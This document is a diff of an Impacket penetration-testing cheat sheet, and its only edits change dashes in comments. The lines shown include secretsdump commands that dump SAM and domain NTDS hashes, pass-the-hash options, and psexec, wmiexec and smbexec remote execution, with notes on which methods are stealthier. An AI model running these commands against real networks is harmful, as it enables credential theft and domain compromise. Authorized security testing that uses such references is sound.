@@ -12,13 +12,13 @@ pip3 install impacket
 
 ## secretsdump.py
 
-Dump credentials remotely — SAM, LSA, NTDS.
+Dump credentials remotely - SAM, LSA, NTDS.
 
 ```sh
 # Dump SAM from workstation (needs local admin)
 secretsdump.py DOMAIN/user:'Password'@<ip>
 
-# NTDS dump — DC only (all domain hashes)
+# NTDS dump - DC only (all domain hashes)
 secretsdump.py DOMAIN/user:'Password'@<DC-IP> -just-dc-ntlm
 
 # Using hash instead of password
@@ -86,15 +86,15 @@ ntlmrelayx.py -6 -t ldaps://<DC-IP> -wh fake.domain.local -l lootme
 ## psexec.py / wmiexec.py / smbexec.py
 
 ```sh
-# psexec — drops service binary (noisy but reliable)
+# psexec - drops service binary (noisy but reliable)
 psexec.py DOMAIN/user:'Password'@<ip>
 psexec.py DOMAIN/user@<ip> -hashes :<NTLM-hash>
 
-# wmiexec — uses WMI, doesn't drop files (stealthier)
+# wmiexec - uses WMI, doesn't drop files (stealthier)
 wmiexec.py DOMAIN/user:'Password'@<ip>
 wmiexec.py DOMAIN/user@<ip> -hashes :<NTLM-hash>
 
-# smbexec — uses SMB shares (very stealthy)
+# smbexec - uses SMB shares (very stealthy)
 smbexec.py DOMAIN/user:'Password'@<ip>
 ```
 
